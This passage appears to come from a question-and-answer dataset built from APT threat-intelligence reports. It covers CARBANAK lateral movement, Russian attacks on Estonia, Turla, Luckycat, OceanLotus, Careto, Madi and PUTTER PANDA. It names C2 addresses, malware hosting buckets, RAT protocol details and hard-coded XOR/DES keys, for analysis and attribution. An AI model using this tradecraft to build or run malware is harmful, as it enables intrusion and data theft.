attackers now had root level access, they did not have user credentials to move laterally within the environment. In order to gain that access, the attackers downloaded versions of the OpenSSH 5.3p1 client and server binaries that had been trojanized with malware known as SSHDOOR, 14 and installed them onto host ALPHA. The SSHDOOR malware will beacon out to IP 185.61.148.96 every 10 minutes until a response is received. A secondary function of this malware was credential theft, by which SSHDOOR sends the username, password and source/destination host to the attackers. The attackers then disengage, leaving the malware to collect credentials until the next day.\nSmall Headline: 3.1.3 Phase 3: D+1 through D+3\nLateral Movement, Secondary Ingress, Internal Reconnaissance, Credential Harvesting\nUpon gaining credentials via the SSHDOOR malware, attackers respond to the SSHDOOR beaconing and establish an SSH tunnel to IP 95.215.46.116 over TCP port 443. In reviewing the configuration and running processes on ALPHA, the attackers observed that the system was running winbind, the UNIX implementations of Microsoft RPC, Pluggable Authentication Modules (PAM) and the name service switch (NSS). This service allows for unified logins across UNIX systems and Microsoft Windows Active Directory (AD). Winbind is a component of samba, the Windows interoperability suite for Linux and UNIX, which stores information about Windows Active Directory in its configuration files. After observing this service running on the system, the attackers checked these configuration files for the DNS names of the Microsoft Windows Domain Controllers used by winbind to authenticate AD accounts. Upon conducting a DNS query for the domain name in the configuration file, the attackers gained the names and IP addresses of the two primary DNS servers (also Windows Domain Controllers) and the server listed in the configuration file. Subsequently, the attackers download a tool named WINEXE, a Linux binary that allows remote command execution on Windows systems.\n14 \"Linux.Sshdoor\";\nThe attackers used credentials taken by the SSHDOOR malware to log in to each of the Windows servers, running the qwinsta.exe and tasklist.exe binaries on each and then logging out.\nSmall Headline: 3.1.4 Phase 4: D+3 through D+25\nPrivilege Escalation, Internal Reconnaissance, Persistence, Entrenchment,\nLateral Movement\nThe attackers also observed that one of the Windows Domain-authenticated credentials stolen was the service account for the client's authenticated vulnerability scans, and was present in the local 'sudoers' file. Having determined the current level of access available to them, the attackers decided to download additional tools in order to establish a static entry point into the environment ensuring they could avoid detection. To accomplish this, the attackers downloaded the PSCAN TCP port scanner and the ALW Advanced Log Wiper binaries and began identifying systems and services accessible from ALPHA.\nFigure 7: Download of ALW and PSCAN from 95.215.46.116\nOne of these systems was the Red Hat Satellite server, which is the primary enterprise update server for Red Hat Enterprise Linux (RHEL) deployments. Given that the Satellite server requires the ability to interact with all other systems under the root user in order to update software, the attackers chose this system as their initial primary staging system. This system was designated system BRAVO. From BRAVO, the attackers traversed the Linux environment through stolen credentials and SSH pre-shared keys and conducted internal reconnaissance on any Windows systems within direct network access. During this time, the attackers strictly contained all malicious files, secondary tools and ingress network communication to the Linux environment. Additionally, they consistently tested the Struts vulnerability on host ALPHA to ensure the initial method of compromise was open, and to alert them to any possible remediation of that system.\n\nQ: What actions did the CARBANAK actors take to perform lateral movement and internal reconnaissance after gaining credentials?",
    "output": "A: Upon gaining credentials via the SSHDOOR malware, the attackers established an SSH tunnel to IP 95.215.46.116 over TCP port 443. They observed that system ALPHA was running winbind, allowing for unified logins across UNIX systems and Microsoft Windows Active Directory (AD). The attackers checked the configuration files for DNS names of the Microsoft Windows Domain Controllers used by winbind to authenticate AD accounts. They then conducted DNS queries to gain the names and IP addresses of the primary DNS servers and downloaded a tool named WINEXE, a Linux binary that allows remote command execution on Windows systems. Using the stolen credentials, they logged into each of the Windows servers, running qwinsta.exe and tasklist.exe binaries on each before logging out.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 9. The Russian Federation\nIn this article study several cyber attacks have been attributed to Russia. Regardless of whether the government of Russia is responsible for the attacks, or merely sanctioned them, for many the perception remains that Russia was behind the cyber attacks. I will examine Russia's use of cyber warfare against former Soviet satellite states. (Davis, 2009)\nThe Russian government views itself as the victim in the case of the cyber attacks on Estonia in 2007. According to sources in the Kremlin the website of the President of Russia came under a cyber attack. This was supposedly the largest attack the Russians have faced and it appeared that the servers used to originate the attack were located in the Baltic States. The Deputy Press Secretary of the Russian President, Dmitry Peskov, countered accusations from Estonia with the fact that Russian government websites are under attack every day from all over the world. (The Baltic Times, 2007a)\nEven as cyber attacks occurred against Georgia, Russians said that they were also the victims of cyber attacks. Russia Today, a major media source in Russia, was shut down because of a denial of service attacks directed towards its websites. IT security specialists that work for Russia Today believe that the denial of service attacks originated from Tbilisi, the capital of Georgia. (Watson, 2008)\nIn the aftermath of the cyber attacks on Estonia, Georgia, and other attacks mentioned in this article, the Russian response was to deny any involvement in any cyber attack. When confronted with evidence that some of the attacks originated from Russian government computers members of the Russian government countered with the fact that computers from all over the world were hijacked and used to attack different computer systems. (The Baltic Times, 2007a)\nAnother fact that Russian officials are quick to point out is that the only person arrested for the 2007 cyber attacks on Estonia was an Estonian. Dmitri Galushkevich, a 20 year old ethnic Russian, who was convicted for the cyber attacks. Some members of the Estonian government have issued statements doubting the involvement of the Russian government in the cyber attacks. (Greenberg, 2008)\nWith the finger pointing that ensues after a cyber attack it is still unclear who was behind the attacks. The actions of cyber activist groups, or hactivists, will be examined in the case of the cyber attacks on Estonia and Georgia. Hactivists are individuals that use cyber attacks to take a patriotic or political stand on a political or international issue. (Melikishvili, 2008/2009)\nDuring the protests in Estonia, increased chatter and postings on how to conduct and participate in denial of service attacks were found on Russian internet chat sites (Melikishvili, 2008/2009). Along with the denial of service attacks, some of the Estonian government websites were hacked in order to deface the site. The sayings on the websites were very pro Russian and very anti Estonian. Joshua Davis in Wired Magazine supports the view that the reason behind the attacks was nothing more than Russian pride. (Davis, 2009)\nIn March of 2009 a member of a Russian pro-Kremlin youth group, Konstantin Goloskokov, publicly took responsibility for creating the 2007 cyber attacks on Estonia. Goloskokov is a leader of the youth movement Nashi that has routinely conducted cyber attacks and intimidation campaigns on behalf of the Russian government. The government of the Russian Federation is able to maintain separation from the youth group because it does not directly fund their activities. The youth groups are funded by pro-government business owners who are trying to gain favour from the Russian government (Shachtman, 2009). Goloskokov believes that his actions were not illegal but were, \"an act of civil disobedience organized within the confines of virtual space\" (Buranov, Vodo & Yegikyan, 2009). The cultural aspects or belief that actions in the cyber world are beyond the law is a consequence for the Russian government and how cyber attacks affect their international relationships.\nAn assistant to Sergei Markov, a member of Russia's State Duma lower house, has also admitted to using his own initiative to conduct cyber attacks against Estonia (Baltic News Service, 2009). Rein Lang, the Estonian Justice Minister, is contemplating issuing a European arrest warrant for individuals who have admitted to taking part in the attack. The idea for the warrant is not to send law enforcement officials into Russia, but to have the alleged perpetrators arrested whenever they leave the country (Baltic News Service, 2009). Aleksandr Gostev, director of the Kaspersky Lab's Global Research and Analysis Team, explains that hackers who participate in a distributed denial of service attack violate the Russian Criminal Code (Article 274, Violation of the Rules Governing the Use of Computers, Computer Systems, or Networks Thereof) and can be imprisoned for four years for violating the code. But he also states that the article is rarely used (Buranov, Vodo & Yegikyan, 2009). The examples of Russian citizens admitting to participating in the Estonian cyber attacks are grounds for\nRussian citizens to be arrested in other parts of Europe if Russia fails to uphold its own laws.\nSimilar actions occurred in the Georgian cyber attacks. Messages were posted on Russian hacker forums on how to participate in shutting down Georgian websites. The website StopGeorgia.ru was also established as a private forum to coordinate the denial of service attacks. Jeff Carr, a network security expert and cyber analyst, established an all volunteer group to investigate the cyber attacks. Throughout the course of the investigation, which they named Project Grey Goose, no evidence was found to implicate the Russian government. This was just another example of a hactivist movement which had the collective power to conduct a cyber attack against a government. (Melikishvili, 2008/2009)\nThe Project Grey Goose investigation has looked at hactivists and how they can independently conduct cyber attacks. It also focused on a criminal gang known as the Russian Business Network (R.B.N.). The R.B.N. is based in St. Petersburg and engages in criminal cyber activities. According to Don Jackson, the director of threat intelligence at Secure Works, some of the cyber attacks used against Georgian websites originated from computers under the control of the R.B.N. As is the case with any cyber attacks it is very difficult to establish who is completely responsible or if there is any Russian government sanctioned involvement. (Markoff, 2008a)\nThis article has already noted that there are other groups involved with cyber attacks against former Soviet satellites. The evidence of Russian government involvement will now be investigated (Davis, 2009). Indeed, some statements made by Russian government officials suggest Russian government involvement in cyber attacks. Prior to the cyber attacks in Estonia the Russian government protested the movement of the Russian memorial, the Bronze Soldier, to the Estonian government. The Russian government warned how disastrous the move would be to Estonia. What followed were the protests and the cyber attacks. (Davis, 2009)\nThe head of the Russian Army Centre for Military Forecast, Colonel Anatoly Tsyganok, made comments to the Russian news outlet, Gazeta, about the cyber attacks on Estonia. He believes that there was nothing wrong with the attacks because there are no international agreements established. Colonel Tsyganok also believes that NATO couldn't do\nanything to stop the attacks, and that they were highly successful. (prygi.blogspot.com, 2008)\nThe most telling example of Russian government involvement in cyber warfare was with Herman Simm selling IT secrets to the Russian Foreign Intelligence Service that was discussed earlier in this article. This examples shows that the government of the Russian Federation is actively seeking information on cyber defences and is willing to pay large sums of money (Mr. Simm is accused of selling cyber security secrets for millions of dollars) to receive information on cyber security. (Melikishvili, 2008/2009)\nThere are also cases where cyber attacks were used against people who are in opposition to the Russian government. One such example is with Gary Kasparov, Russian opposition party leader, had his website shut down for two weeks due to denial of service attacks during the Russian presidential campaign. John Palfrey, a researcher at Harvard Law School, believes that several organizations in Russia who plan to protest, or act in opposition to the Russian government, are subjected to cyber attacks in an attempt to control the information that is getting to the public. (Greenberg, 2008)\nAnother example of Russian government complicity is the lack of assistance or interest in tracking down those responsible for the cyber attacks against governments of former Soviet satellites (Davis, 2009). The evidence of government involvement remains circumstantial, but certain facts are clear concerning cyber security and former Soviet satellites. If there is opposition to Russian Federation policy than that country that is in opposition is likely to be subject to a cyber attack and it has been shown that the Russian Federation actively collects information on other countries cyber defences.\nQuestion: How did the Russian government respond to accusations of involvement in the 2007 cyber attacks on Estonia, and what counterarguments did they present?",
    "output": "Answer: The Russian government denied any involvement in the 2007 cyber attacks on Estonia. They countered the accusations by stating that Russian government websites are under attack every day from all over the world. Additionally, they pointed out that the only person arrested for the attacks was an Estonian citizen, Dmitri Galushkevich. Russian officials also argued that computers from various locations were hijacked and used in the attacks, making it difficult to pinpoint the true culprits.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Language deficits\nA small collection of strings demonstrates the language deficits, mainly distinguishable as:\nUse of backticks instead of apostrophes by some of the developers\nProblems using past tense by some developers\nSpelling\nMistranslated terms\nOversights\nExamples:\nwin32 detect... x64 detect...\nCretaFileA(%s):\nCan`t open SERVICES key error has been suddenly occured timeout condition has been occured inside call of function\nOPER|Survive me, i`m close to death... free space less than 5%%...|\\n\nOPER|Sniffer '%s' running... ooopppsss...|\\n\nTask not execute. Arg file failed.\nUpdate failed =(( Can`t create file. can`t get characs.\\n\nInternal command not support =((\\n\nL|-1|can`t get characs %s|\\n\nSmall Headline: Public services\nBGP Ranking\nCommon vulnerability exposure\nPGP key server\nMap of attacks against Luxembourg\nFree software\nCIRCL is the national CERT/CSIRT (Computer Emergency Response Team/Computer Security Incident Response Team) for Luxembourg.\nContent from this website is classified as TLP:WHITE information may be distributed without restriction, subject to copyright controls.\nCopyright 2008 - 2014 CIRCL Computer Incident Response Center Luxembourg (smile gie), national CERT.\nPGP signature of this page and How to Verify Integrity of CIRCL Web Pages\n\nBased on the above text, answer a question. Based on the language deficits observed in the Uroburos (Turla) malware, what insights can be gained about the developers' linguistic proficiency and potential oversights? How might these observations aid in attribution and detection efforts?",
    "output": "The language deficits observed in the Uroburos (Turla) malware include the use of backticks instead of apostrophes, problems with past tense, spelling errors, mistranslated terms, and oversights. Examples include phrases like 'Can`t open SERVICES key error has been suddenly occured' and 'OPER|Survive me, i`m close to death... free space less than 5%%...|\\\\n'. These deficits suggest that the developers may not be native English speakers and could indicate their level of linguistic proficiency. Such observations can aid in attribution by providing clues about the developers' background and potential origin. Additionally, these language patterns can be used to create signatures or heuristics for detection systems, helping to identify similar malware or variants in the future.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview\nContents\nA series of attacks, targeting both Indian military research and south Asian shipping organizations, demonstrate the minimum level of effort required to successfully compromise a target and steal sensitive information. The attackers use very simple malware, which required little development time or skills, in conjunction with freely available Web hosting, to implement a highly effective attack. It is a case of the attackers obtaining a maximum return on their investment. The attack shows how an intelligent attacker does not need to be particularly technically skilled in order to steal the information they are after.\nThe attack begins, as is often the case, with an email sent to the victim. A malicious document is attached to the email, which, when loaded, activates the malware.  The attackers use tailored emails to encourage the victim to open the email. For example, one email sent to an academic claimed to be a call for papers for a conference (CFP). Academics receive dozens of CFPs every year. If the victim has previously presented at that particular conference, or is interested in the subject matter, they are quite likely to open the CFP. Another email sent to a maritime organization claims to contain details of an alert beaconing system. Again, this is a relevant topic for the recipient. A judicious choice of email topics and recipients by the attackers is the most effective way of compromising the target and also maintaining a low profile. Fewer, more effective emails, which do not draw attention to themselves, allow the attacks to continue undetected for as long as possible. Discreet malware also aids this cause.\nAfter the email attachment has been opened by the victim, the malware, (<http://www.symantec.com/security_response/writeup.jsp?docid=2012-011606-0524-99>)VBS.Sojax, is activated. The attackers chose a very simple technique for\ntheir malware. Rather than using a compiled programming language to write the back door Trojan, they used a Visual Basic script. Scripts are very simple to develop, requiring less expertise and time to develop than a standard back door Trojan. The script itself is quite simple. It connects to a command-and-control (C&C) server to retrieve commands and upload data. HTTP is used to easily pass through firewalls. The script functionality is basic; it can run commands and it can upload and download files. This is enough to retrieve any information the attackers want. Again, minimal effort is expended for maximum gain.\nThe same ethos is shown with the choice of C&C servers. C&C servers are a potential pitfall for the attackers as it may be possible for an investigator to track the attackers using registration details for the C&C server. This is the case when the attackers register and pay for their own C&C server. A commonly used alternative is for attackers to commandeer an innocent third party server for their own purposes. This requires effort, however, as the attackers must firstly locate and then hack into the server. The Sojax attackers use an approach that requires much less effort. They use free Web hosting. There are hundreds of free Web hosting sites that require little or no registration information. Once the attackers have registered the free service, they create a directory and upload a PHP script that acts as the C&C server. They then modify their malware scripts to use this new URL and email the scripts out to targets. Symantec identified 25 C&C servers. Only two or three of these were active, the rest had been abandoned. Several partial listings of stolen file names (not the files) were retrieved from the server, along with the IP addresses of compromised computers and the IP addresses of the attackers.\nThe vast majority of the victims were based in India, with some in Malaysia. The victim industry was mostly military research and also shipping based in the Arabian and South China seas. In some instances the attackers appeared to have a clear goal, whereby specific files were retrieved from certain compromised computers. In other cases, the attackers used more of a 'shotgun' like approach, copying every file from a computer. Military technologies were obviously the focus of one particular attack with what appeared to be source code stolen. 45 different attacker IP addresses were observed. Out of those, 43 were within the same IP address range based in Sichuan province, China. The remaining two were based in South Korea. The pattern of attacker connections implies that the IP addresses are being used as a VPN, probably in an attempt to render the attackers anonymous.\nThe attacks have been active from at least April 2011 up to February 2012. The attackers are intelligent and focused, employing the minimum amount of work necessary for the maximum gain. They do not use zero day exploits or complicated threats, instead they rely on effective social engineering and lax security measures on the part of the victims. Security awareness training and a consistent patching strategy would have protected the victims from these attacks.\nQ: How did the Luckycat hackers leverage social engineering techniques to increase the effectiveness of their phishing emails, and why was this approach particularly successful?",
    "output": "The Luckycat hackers leveraged social engineering techniques by sending tailored emails to their victims. For instance, an email sent to an academic claimed to be a call for papers for a conference, while another email sent to a maritime organization claimed to contain details of an alert beaconing system. These topics were specifically chosen to be relevant to the recipients, increasing the likelihood that they would open the attachments. This approach was particularly successful because it targeted individuals who were likely to be interested in the content, making the emails appear legitimate and reducing suspicion. By sending fewer, more effective emails, the attackers could maintain a low profile and prolong the duration of their undetected activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Whitelisted Targeting for Google Account Access\nVolexity was able to work with organizations on the OceanLotus whitelist that received special responses from Framework B. As a result, Volexity was able to directly observe two different OceanLotus attacks that attempted to fool the targeted user into providing access to their Google Accounts. OceanLotus attempts to compromise Google Accounts by prompting the user with a popup directing them to provide OAuth authorizations to a malicious Google App. Once a user has been flagged for targeting, they will receive a popup when accessing an OceanLotus compromised website once every 24 hours. This popup slowly fades in over top of the legitimate website and appears quite legitimate. Screen shots of two different observed popups are shown below.\nVersion 1: Locked Content\nVersion 2: Chrome Sign In\nRegardless of which option the user clicks, they are redirected to Google to initiate OAuth access to one of OceanLotus' Google Apps. Below is a screen shot of what a user would see prior to authorizing the the nefarious Google App.\nOceanLotus Google App OAuth\nIf the targeted user chooses ALLOW, the OceanLotus Google App immediately logs into the account and starts accessing it. The account has permissions to access all e-mail and contacts, which is all the access OceanLotus needs to conduct digital surveillance. Volexity strongly recommends that anyone that thinks they may have been targeted with this campaign or similar attacks review the Defense Against Ocean Lotus section below.\nOceanLotus is also known to be distributing malware in the form of fake Internet Explorer, Chrome, and Firefox updates. Volexity has observed similar attacks via spear phishing against targeted organizations that leverage some of the same malware infrastructure. In these cases, the following Amazon S3 buckets were used to distribute the malware through JavaScript as part of OceanLotus Framework B or direct links from spear phishing campaigns.\ndload01.s3.amazonaws.com\ndownload-attachments.s3.amazonaws.com\nVolexity has observed multiple custom malware families and Cobalt Strike delivered through these campaigns. Details on the observed malware samples are forthcoming.\n\nQ: What methods does the OceanLotus group use to distribute malware, and what types of malware have been observed in these campaigns? Explain the distribution channels and the malware families involved.",
    "output": "A: The OceanLotus group distributes malware in the form of fake Internet Explorer, Chrome, and Firefox updates. They utilize spear phishing campaigns and JavaScript within their Framework B to deliver the malware. Specifically, Amazon S3 buckets such as 'dload01.s3.amazonaws.com' and 'download-attachments.s3.amazonaws.com' have been observed as distribution channels. Through these campaigns, multiple custom malware families and Cobalt Strike have been delivered. The exact details of the observed malware samples are forthcoming, indicating a diverse and sophisticated malware arsenal employed by the OceanLotus group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2.8. Victims\nDuring the investigation we were able to sinkhole some of the C&C servers. All sinkholed domains have been redirected to the Kaspersky Sinkhole server. This provided detailed information regarding the location of the victims.\nAdditionally, some of the Command and control servers maintain a debug log which includes information about the victims such as IPs and timestamps. This debug log file is stored in a folder named \"ClientsDirectory\" and is named \"log.txt\". By collecting \"log.txt\" files from various Careto C&C servers, it was possible to make a more detailed map of the IPs for victims of these attacks.\nIn total, we observed over 1,000 victims' IPs in 31 countries. We have also found traces of at least 380 different victim\u00b4s IDs according to attackers\u00b4 naming schema both in logs and sinkholed requests.\nThe following charts correspond only to sinkholed data and ignores the historical one retrieved in log files. This data is fresher, showing the current interest of the attackers.\nThe first chart shows the geographical distribution of the victim\u00b4s IDs:\nIn this case there is a clear outlier. The reason is that there is a big cluster of victims in Cuba corresponding to very few IP addresses, all belonging to the same institution.\nThe followin chart provides the geographical location of victim\u00b4s IPs instead of Ids using only sinkholed data:\nIn this chart we see the opposite effect than in the previous one, in this case with Venezuela, where few victims use multiple IPs.\nSpain, France and Morocco are the only countries appearing in the top 5 in all cases.\nThe main targets of Careto fall into the following categories:\n\u25cf Government institutions\n\u25cf Diplomatic / embassies\n\u25cf Energy, oil and gas companies\n\u25cf Research\n\u25cf Private equity firma\n\u25cf Activists\nBig Headline: 3. Attribution\nDifferent malware components include language artifacts from the authors, suggesting they are proficient in the Spanish language. Some slang words used would be very uncommon in a non native Spanish speaker.\nFor instance, the \"appleupdt[dot]com\" C&C domain has been registered by one \"Victoria Gomez\" from Argentina. The registration data appears fake, though.\nSpanish language artifacts include:\n\uf0b7 \"Careto - GetSystemReport v1.0\" - in the \"waiter32/64\" module\n\uf0b7 \"Unistalling Careto\" - in the CDlUninstallSGH32 module\n\"Careto\" is a Spanish slang word for \"face\".\n\uf0b7 \"Caguen1aMar\" - an RC4 encryption key stored in the configuration data. Used for all communications with the command and control servers.\nThis would be the contraction of \"Me cago en la mar\", a Spanish expression meaning \"fuck\".\n\uf0b7 \"Accept-Language: es Accept-Encoding: gzip\" - in the configuration data\nThe authors did a number of mistakes as well. For instance, they forgot debug information in a SGHTesterCmd module which contains a path on the developer's machine:\n\uf0b7 c:\\Dev\\CaretoPruebas3.0\\release32\\CDllUninstall32.pdb\n\"Pruebas\" means \"tests\" in Spanish.\nAlso there are some small mistakes in some English comments:\n//Attempt to move the uploaded file to it's new place\nUnistalling Careto\nUinstalling SGH\nIn the exploiting server we have found most of the subdomains simulating newspapers from Spain.\nIt should be noted that Spanish is spoken in 21 countries, where it is either a national language or de facto official language. We should also not exclude the possibility of a false flag operation, where the attackers intentionally planted Spanish words in order to confuse analysis.\nRead the text above and answer this question: What evidence suggests that the authors of the 'Mask' APT group are proficient in the Spanish language, and how did the investigators identify potential false flags in their attribution efforts?",
    "output": "Several pieces of evidence suggest that the authors of the 'Mask' APT group are proficient in the Spanish language. These include language artifacts such as 'Careto - GetSystemReport v1.0' in the 'waiter32/64' module, 'Unistalling Careto' in the CDlUninstallSGH32 module, and the use of the Spanish slang word 'Careto' which means 'face'. Additionally, the RC4 encryption key 'Caguen1aMar', a contraction of the Spanish expression 'Me cago en la mar', and the path 'c:\\\\Dev\\\\CaretoPruebas3.0\\\\release32\\\\CDllUninstall32.pdb' where 'Pruebas' means 'tests' in Spanish, further support this. However, the investigators also noted that Spanish is spoken in 21 countries and acknowledged the possibility of a false flag operation where the attackers intentionally planted Spanish words to confuse analysis.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does Dino employ a classic Animal Farm technique to hide its calls to certain API functions, and what specific hashing algorithm is used in this process?",
    "output": "Dino employs a classic Animal Farm technique to hide its calls to certain API functions by calculating a hash from the function's name and using this hash to look up the address of the API function. The specific hashing algorithm used in Dino is a combination of rotate-left (ROL) of 7 bits and exclusive-or (XOR) operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Timer 38: Update more resources from the template downloader (Soltanik.exe)\nSeveral entries are added to RCDATA:\nShelikn : Special BotID generated by Timer 35\nSiteW: C&C IP address\nBind: Empty (according to analysis of the downloaders that use social engineering, it should be the extension of the embedded file dropped to social engineering victims. If MAHDI contains a Base64 encoded picture, Bind should be set to .JPG).\nFilee: SCR\nRoze: 0\nOnce the resources have been updated, Timer 39 is enabled and Timer 38 returns.\nMedium Headline: Timer 39: Generate a final binary: Server.exe with updated icon\nAt the end of Timer 38, soltanik.exe has been fully updated with new resources. Upon execution, Timer 39 disables itself and starts generating a special command line for the Resource Hacker tool that was created as \"Res.exe\" by Timer 47.\nThe command line is the following:\nThere is a bug in the routine. An executable name is missing right after \"-extract\".\nThe command line dumps the Main Icon to disk (Icon_1.ico) and creates a file called \"output.rc\".\nAt this point, it is impossible to know which file was meant to be used as the source of a new icon. For the sake of our analysis, let's pretend the bug doesn't exist and that a valid file name was provided.\nAfterwards, a second command line is passed to \"Res.exe\":\nThis final command line will generate Server.exe, a copy of soltanik.exe whose icon has been changed to the one extracted in the previous command.\nServer.exe is now fully updated. Its resources are filled, and its icon changed. It's not clear why the authors did this, but despite all the bugs it was possible to understand the overall aim of the routine: to create a Server.exe file from soltanik.exe with a new icon and added resources. What happens to Server.exe? Nothing, this is a non-working feature. It appears Madi has the ability to generate new downloaders, at least, in theory.\nThe 7 remaining timers won't be described as they are of little interest.\nBig Headline: Conclusions\nIn this article we closely analyzed the infostealer used in the Madi campaign. The coding style and the usage of Delphi, together with the programming techniques indicate a rudimentary approach.\nMost of the data-stealing actions and communication with the C&C servers take place via external files, which is rather messy. Whoever coded it is probably still reading through the first chapters of their Delphi manuals.\nThis is maybe why it is surprising to note its effectiveness, considering the data received from the sinkhole. During the monitored period, a little over 800 victims were connected to the servers. All of them\nfell prey to the various social engineering techniques used by the malware.\nTo sum up, we can say the following:\nthe components of the Madi campaign are surprisingly unsophisticated\nno exploits or advanced 0-day techniques are used anywhere in the malware\ndespite that, the overall success of the campaign is surprisingly high\nnevertheless, we should remember that even low quality malware can steal data\nMadi was a low investment, high profit project\nits authors remain unknown\nWe will continue to monitor the Madi malware and update you on our findings in the future.\nQ: Why does the Madi malware update resources and change the icon of Soltanik.exe to generate Server.exe, even though this feature does not seem to be functional?",
    "output": "The Madi malware updates resources and changes the icon of Soltanik.exe to generate Server.exe as part of a theoretical capability to create new downloaders. Despite the presence of bugs in the routine, the overall aim appears to be creating a new executable with updated resources and a different icon. However, this feature is non-functional, and it is unclear why the authors included it. This might suggest that the malware developers were experimenting with new features or had plans to implement additional functionality in the future.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: concLusions\nthere is strong evidence to tie cpyy, an actor who appears to have been involved in historical PUttEr Panda operations, to the Pla army and a location in shanghai that is operated by the 12th Bureau, 3rd Gsd of the Pla (Unit 61486). another actor tied to this activity, httpchen, has declared publically that he was attending the school of Information security Engineering at sJtU. this university has previously been posited as a recruiting ground for the Pla to find personnel for its cyber intelligence gathering units, and there is circumstantial evidence linked cpyy to other actors based at sJtU.\nGiven the evidence outlined above, Crowdstrike attributes the PUttEr Panda group to Pla Unit 61486 within shanghai, China with high confidence. It is likely that this organization is staffed in part by current or former students of sJtU, and shares some resources and direction with Pla Unit 61398 (CoMMEnt Panda).\nMedium Headline: tEcHnicaL anaLysis\nseveral rats are used by PUttEr Panda. the most common of these, the 4H rat and the 3Para rat, have been documented previously by Crowdstrike in previous Crowdstrike Intelligence reporting. this analysis will be revisited below, along with an examination of two other PUttEr Panda tools: pngdowner and httpclient. two droppers have been associated with the PUttEr Panda toolset; these are also briefly examined below.\nSmall Headline: 4H rat \u2013 EXaMPlE Md5 HasH a76419a2FCa12427C887895E12a3442B\nthis rat was first analyzed by Crowdstrike in april 2012, but a historical analysis shows that it has been in screenshot of truecaller use since at least 2007 by the PUttEr Panda actors. a listing of metadata for known samples, including C2 information, is shown in appendix 1. Database shared by\nDEaDEyE JacKaL on their twitter account (names the operation of this rat is described in detail in other Crowdstrike reporting, but is useful to revisit here to highlight the characteristics of the rat: redacted)\n\u2022 C2 occurs over HTTP, after connectivity has been verified by making a distinctive request (to the URI / search?qu= at www.google.com).\n\u2022 A victim identifier is generated from the infected machine's hard disk serial number, XOR'ed with the key ldd46!yo , and finally nibble-wise encoded as upper-case asCII characters in the range (a-P) \u2013 e.g., the byte value 0x1F becomes \"BP\".\n\u2022 A series of HTTP requests characterizes the RAT's C2. The initial beacon uses a request with four parameters (h1, h2, h3, and h4) \u2013 as shown in Figure 8 \u2013 to register the implant with the C2 server.\n\u2022 Communication to and from the C2 server is obfuscated using a 1-byte XOR with the key 0xBE.\n\u2022 The commands supported by the RAT enable several capabilities, including:\no remote shell\no listing of running processes (including loaded modules)\no Process termination (specified by PId)\no File and directory listing\no File upload, download, deletion, and timestamp modification\nExample Beacon\nruecaller hared by\nredacted)\nSmall Headline: 3Para rat \u2013 EXaMPlE Md5 HasH BC4E9dad71B844dd3233CFBBB96C1Bd3\nFigure 9. sample Python Code to  decode Hostname from User-agent snippet\nthe 3Para rat was described in some detail in other Crowdstrike reporting, which examined a dll-based sample with an exported filename of ssdpsvc.dll. other observed exported filenames are msacem.dll and mrpmsg.dll, although the rat has also been observed in plain executable (EXE) format.\non startup, the rat attempts to create a file mapping named &*sdKJfhksdf89*dIUKJdsF&*sdfsdf78sdfsdf. this is used to prevent multiple instances of the rat being executed simultaneously. the rat will then use a byte-wise subtraction-based algorithm (using a hard-coded modulo value) to decode C2 server details consisting of a server hostname and port number, in this example nsc.adomhn. com, port 80. the decoding algorithm is illustrated in Figure 10 below. the key and modulo values vary on a per-sample basis. decoded C2 settings, along with sample metadata, are listed in appendix 2.\nthe rat is programmed in C++ using Microsoft Visual studio, and it makes use of the object-oriented and parallel programming features of this environment; standard template library (stl) objects are used to represent data structures such as strings and lists, and custom objects are used to represent some of the C2 command handlers (e.g., CCommandCMd). several threads are used to handle different stages of the C2 protocol, such as receiving data from the server, decrypting data, and processing commands. standard Windows primitives such as Events are used to synchronize across these threads, with a shared global structure used to hold state.\nFigure 10. sample Python Code Illustrating C2 server decoding routine\nscreenshot of truecaller once running, the rat will load a binary representation of a date/time value13 from a Database shared by  file C:\\rECYClEr\\restore.dat, and it will sleep until after this date/time has passed. this provides a mechanism for the operators to allow the rat to remain dormant until a DEaDEyE JacKaL on their twitter account (names fixed time, perhaps to allow a means of regaining access if other parts of their toolset are removed from a victim system. redacted)\nas with the 4H rat, the C2 protocol used by the 3Para rat is HttP based, using both GEt and Post requests. an initial request is made to the C2 server (illustrated in Figure 11 above), but the response value is effectively ignored; it is likely that this request serves only as a connectivity check, as further C2 activity will only occur if this first request is successful. In this case, the rat will transmit some basic victim information to the C2 server along with a 256-byte hash of the hard-coded string HYF54&%9&jkMCXuis. It is likely that this request functions as a means to authenticate the rat to the C2 server and register a new victim machine with the controller. a sample request and its structure are shown in Figure 12.\n13Using the standard Windows SYSTEMTIME structure\n14See http://msdn.microsoft.com/en-us/library/windows/desktop/bb759853(v=vs.85).aspx for details of this API, which is rarely used.\nIf this request is also successful, the rat will attempt to retrieve tasking from the controller using a further distinctive HttP request shown in Figure 13, repeating this request every two seconds until valid tasking is returned.\nscreenshot of truecaller\nDatabase shared by\nreturned tasking is decrypted using the dEs algorithm in CBC mode with a key derived from the Md5 hash of the string HYF54&%9&jkMCXuis (as used in the secondary beacon shown above). If this fails, the rat will fall back to decoding the data using an 8-byte Xor with a key derived from data returned from the Hashdata aPI with the same key string. output data produced by tasking instructions is encrypted in the same manner as it was decrypted and sent back to the C2 server via HttP Post request to a UrI of the form /microsoft/errorpost/ default.aspx?Id=, where the Id value is a random number in decimal representation \u2013 as with the initial request shown in Figure 4.\nthe set of commands supported by the rat is somewhat limited, indicating that perhaps the rat is intended to be used as a second-stage tool, or as a failsafe means for the attackers to regain basic access to a compromised system (which is consistent with its support for sleeping until a certain date/time). some of the supported commands are implemented using C++ classes derived from a base CCommand class:\n\u2022 CCommandAttribe \u2013 Retrieve metadata for files on disk, or set certain attributes such as creation/ modification timestamps.\n\u2022 CCommandCD \u2013 Change the working directory for the current C2 session.\n\u2022 CCommandCMD \u2013 Execute a command, with standard input/output/error redirected over the C2 